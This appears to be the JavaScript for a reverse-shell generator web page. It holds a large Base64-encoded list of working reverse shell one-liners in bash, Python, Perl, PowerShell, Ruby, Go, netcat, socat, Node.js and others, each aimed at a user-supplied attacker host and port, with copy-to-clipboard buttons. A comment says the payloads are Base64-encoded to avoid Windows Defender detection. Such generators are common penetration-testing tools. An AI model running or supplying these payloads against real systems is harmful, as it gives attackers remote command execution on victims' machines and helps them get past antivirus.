
const STORAGE_KEY = 'ATTACKER';

function main() {
  // Get LHOST and LPORT info from session storage if exists.
  let listenInfo = window.sessionStorage.getItem(STORAGE_KEY);
  listenInfo = JSON.parse(listenInfo);
  const lhost = (listenInfo && listenInfo.lhost) || '10.0.0.1';
  const lport = (listenInfo && listenInfo.lport) || '4444';
  drawRevShellList(lhost, lport);

  // Form input default value.
  $('#inputLHOST').val(lhost);
  $('#inputLPORT').val(lport);

  // Submit when press enter key.
  $('#inputLHOST').keypress(function (e) {
    if (e.which === 13) {
      submit();
      return false;
    }
  });
  $('#inputLPORT').keypress(function (e) {
    if (e.which === 13) {
      submit();
      return false;
    }
  });
}

function submit() {
  const lhost = $('#inputLHOST').val().toString();
  const lport = $('#inputLPORT').val().toString();
  if (lhost !== "" && lport !== "") {
    $('#revshList').empty();
    drawRevShellList(lhost, lport);
    // Set LHOST and LPORT info into session storage.
    const listenInfo = {'lhost': lhost, 'lport': lport};
    window.sessionStorage.setItem(STORAGE_KEY, JSON.stringify(listenInfo));
  }
}

function drawRevShellList(lhost, lport) {
  languages = Object.keys(reverseShells)
  for (let i = 0; i < languages.length; i++) {
    const language = languages[i];
    for (let j = 0; j < reverseShells[language].length; j++) {
      let reverseShell = reverseShells[language][j]; // Base64 revshell string
      reverseShell = atob(reverseShell);
      reverseShell = reverseShell.replace('{0}', `<span class="bg-warning">${htmlEscape(lhost)}</span>`);
      reverseShell = reverseShell.replace('{1}', `<span class="bg-warning">${htmlEscape(lport)}</span>`);
      //console.log(reverseShell);

      // Template
      $('#revshList').append(`
      <li id="revsh_${i}_${j}" class="list-group-item d-flex justify-content-between align-items-start">
        <div class="ms-2 me-auto" style="width: 80%">
          <div class="fw-bold">${language}</div>
          <code class="copy_target">${reverseShell}</code>
        </div>
        <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top"
          title="Copy to clipboard" id="copy-input">
          Copy
        </button>
      </li>
      `);

      const $copy_input = $(`#revsh_${i}_${j}`).find('.copy_input');
      //「Copy」ボタン押下
      $copy_input.click(function () {
        // 対象の文字列をinputに格納してからコピーする
        const text = $(`#revsh_${i}_${j}`).find('.copy_target').text();
        $('#input').val(text);
        var copyText = document.querySelector("#input");
        copyText.select();
        document.execCommand("copy");
        // コピー完了したらツールチップ表示
        $(this).tooltip('show');
      });
      //「Copy」ボタンのツールチップ（補足説明）の設定
      $copy_input
        .tooltip({
          trigger: 'manual'
        })
        // tooltip表示後の動作を設定
        .on('shown.bs.tooltip', function () {
          setTimeout((function () {
            $(this).tooltip('hide');
          }).bind(this), 1500);
        });
    }
  }
}

// ローカル開発時にWindows Definderに検知されないようにBase64で保存すること

reverseShells = {

  "bash": ['YmFzaCAtaSA+JiAvZGV2L3RjcC97MH0vezF9IDA+JjE=',
    'MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC97MH0vezF9OyBzaCA8JjE5NiA+JjE5NiAyPiYxOTY='],

  "python":
    ['cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiezB9Iix7MX0pKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc=',
      'Tk9URTogUHl0aG9uMwpweXRob24zIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiezB9Iix7MX0pKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc='],

  "perl":
    ['cGVybCAtZSAndXNlIFNvY2tldDskaT0iezB9IjskcD17MX07c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe3tvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9fTsn',
      'cGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApOyRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCJ7MH06ezF9Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0+ZmRvcGVuKCRjLHcpO3N5c3RlbSRfIHdoaWxlPD47Jw==',
      'Tk9URTogV2luZG93cyBvbmx5CnBlcmwgLU1JTyAtZSAnJGM9bmV3IElPOjpTb2NrZXQ6OklORVQoUGVlckFkZHIsInswfTp7MX0iKTtTVERJTi0+ZmRvcGVuKCRjLHIpOyR+LT5mZG9wZW4oJGMsdyk7c3lzdGVtJF8gd2hpbGU8Pjsn'],

  "powershell":
    ['cG93ZXJzaGVsbCAtTm9QIC1Ob25JIC1XIEhpZGRlbiAtRXhlYyBCeXBhc3MgLUNvbW1hbmQgTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCJ7MH0iLHsxfSk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7ezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiAgPSAkc2VuZGJhY2sgKyAiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiOyRzZW5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygkc2VuZGJhY2syKTskc3RyZWFtLldyaXRlKCRzZW5kYnl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpOyRzdHJlYW0uRmx1c2goKX19OyRjbGllbnQuQ2xvc2UoKQ==',
      'cG93ZXJzaGVsbCAtbm9wIC1jICIkY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCd7MH0nLHsxfSk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7ezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc+ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfX07JGNsaWVudC5DbG9zZSgpIg=='],

  "ruby":
    ['cnVieSAtcnNvY2tldCAtZSdmPVRDUFNvY2tldC5vcGVuKCJ7MH0iLHsxfSkudG9faTtleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgPCYlZCA+JiVkIDI+JiVkIixmLGYsZikn',
      'cnVieSAtcnNvY2tldCAtZSAnZXhpdCBpZiBmb3JrO2M9VENQU29ja2V0Lm5ldygiezB9IiwiezF9Iik7d2hpbGUoY21kPWMuZ2V0cyk7SU8ucG9wZW4oY21kLCJyIil7e3xpb3xjLnByaW50IGlvLnJlYWR9fWVuZCc=',
      'Tk9URTogV2luZG93cyBvbmx5CnJ1YnkgLXJzb2NrZXQgLWUgJ2M9VENQU29ja2V0Lm5ldygiezB9IiwiezF9Iik7d2hpbGUoY21kPWMuZ2V0cyk7SU8ucG9wZW4oY21kLCJyIil7e3xpb3xjLnByaW50IGlvLnJlYWR9fWVuZCc='],

  "golang":
    ['ZWNobyAncGFja2FnZSBtYWluO2ltcG9ydCJvcy9leGVjIjtpbXBvcnQibmV0IjtmdW5jIG1haW4oKXt7YyxfOj1uZXQuRGlhbCgidGNwIiwiezB9OnsxfSIpO2NtZDo9ZXhlYy5Db21tYW5kKCIvYmluL3NoIik7Y21kLlN0ZGluPWM7Y21kLlN0ZG91dD1jO2NtZC5TdGRlcnI9YztjbWQuUnVuKCl9fScgPiAvdG1wL3QuZ28gJiYgZ28gcnVuIC90bXAvdC5nbyAmJiBybSAvdG1wL3QuZ28='],

  "netcat": ['bmMgLWUgL2Jpbi9zaCB7MH0gezF9', 'bmMgLWUgL2Jpbi9iYXNoIHswfSB7MX0=', 'bmMgLWMgYmFzaCB7MH0gezF9',
    'Tk9URTogT3BlbkJTRApybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyB7MH0gezF9ID4vdG1wL2Y='],

  "ncat": ['bmNhdCB7MH0gezF9IC1lIC9iaW4vYmFzaA==', 'bmNhdCAtLXVkcCB7MH0gezF9IC1lIC9iaW4vYmFzaA=='],

  "awk":
    ['YXdrICdCRUdJTiB7e3MgPSAiL2luZXQvdGNwLzAvezB9L3sxfSI7IHdoaWxlKDQyKSB7eyBkb3t7IHByaW50ZiAic2hlbGw+IiB8JiBzOyBzIHwmIGdldGxpbmUgYzsgaWYoYyl7eyB3aGlsZSAoKGMgfCYgZ2V0bGluZSkgPiAwKSBwcmludCAkMCB8JiBzOyBjbG9zZShjKTsgfX0gfX0gd2hpbGUoYyAhPSAiZXhpdCIpIGNsb3NlKHMpOyB9fX19JyAvZGV2L251bGw='],

  "lua":
    ['Tk9URTogTGludXggb25seQpsdWEgLWUgInJlcXVpcmUoJ3NvY2tldCcpO3JlcXVpcmUoJ29zJyk7dD1zb2NrZXQudGNwKCk7dDpjb25uZWN0KCd7MH0nLCd7MX0nKTtvcy5leGVjdXRlKCcvYmluL3NoIC1pIDwmMyA+JjMgMj4mMycpOyI=',
      'bHVhNS4xIC1lICdsb2NhbCBob3N0LCBwb3J0ID0gInswfSIsIHsxfSBsb2NhbCBzb2NrZXQgPSByZXF1aXJlKCJzb2NrZXQiKSBsb2NhbCB0Y3AgPSBzb2NrZXQudGNwKCkgbG9jYWwgaW8gPSByZXF1aXJlKCJpbyIpIHRjcDpjb25uZWN0KGhvc3QsIHBvcnQpOyB3aGlsZSB0cnVlIGRvIGxvY2FsIGNtZCwgc3RhdHVzLCBwYXJ0aWFsID0gdGNwOnJlY2VpdmUoKSBsb2NhbCBmID0gaW8ucG9wZW4oY21kLCAiciIpIGxvY2FsIHMgPSBmOnJlYWQoIiphIikgZjpjbG9zZSgpIHRjcDpzZW5kKHMpIGlmIHN0YXR1cyA9PSAiY2xvc2VkIiB0aGVuIGJyZWFrIGVuZCBlbmQgdGNwOmNsb3NlKCkn'],

  "java":
    ['ciA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpO3AgPSByLmV4ZWMoWyIvYmluL3NoIiwiLWMiLCJleGVjIDU8Pi9kZXYvdGNwL3swfS97MX07Y2F0IDwmNSB8IHdoaWxlIHJlYWQgbGluZTsgZG8gXCRsaW5lIDI+JjUgPiY1OyBkb25lIl0gYXMgU3RyaW5nW10pO3Aud2FpdEZvcigpOw=='],

  "socat": ['c29jYXQgZXhlYzonYmFzaCAtbGknLHB0eSxzdGRlcnIsc2V0c2lkLHNpZ2ludCxzYW5lIHRjcDp7MH06ezF9',
    'c29jYXQgdGNwLWNvbm5lY3Q6e306e30gc3lzdGVtOi9iaW4vc2g='],

  "nodejs":
    ['KGZ1bmN0aW9uKCl7e3ZhciBuZXQ9cmVxdWlyZSgibmV0IiksY3A9cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLHNoPWNwLnNwYXduKCIvYmluL3NoIixbXSk7dmFyIGNsaWVudD1uZXcgbmV0LlNvY2tldCgpO2NsaWVudC5jb25uZWN0KHsxfSwiezB9IixmdW5jdGlvbigpe3tjbGllbnQucGlwZShzaC5zdGRpbik7c2guc3Rkb3V0LnBpcGUoY2xpZW50KTtzaC5zdGRlcnIucGlwZShjbGllbnQpO319KTtyZXR1cm4gL2EvO319KSgpOw=='],

  "telnet": ['cm0gLWYgL3RtcC9wOyBta25vZCAvdG1wL3AgcCAmJiB0ZWxuZXQgezB9IHsxfSAwL3RtcC9w']

}


function htmlEscape(str) {
  if (!str) return;
  return str.replace(/[<>&"'`]/g, function (match) {
    const escape = {
      '<': '&lt;',
      '>': '&gt;',
      '&': '&amp;',
      '"': '&quot;',
      "'": '&#39;',
      '`': '&#x60;'
    };
    return escape[match];
  });
}
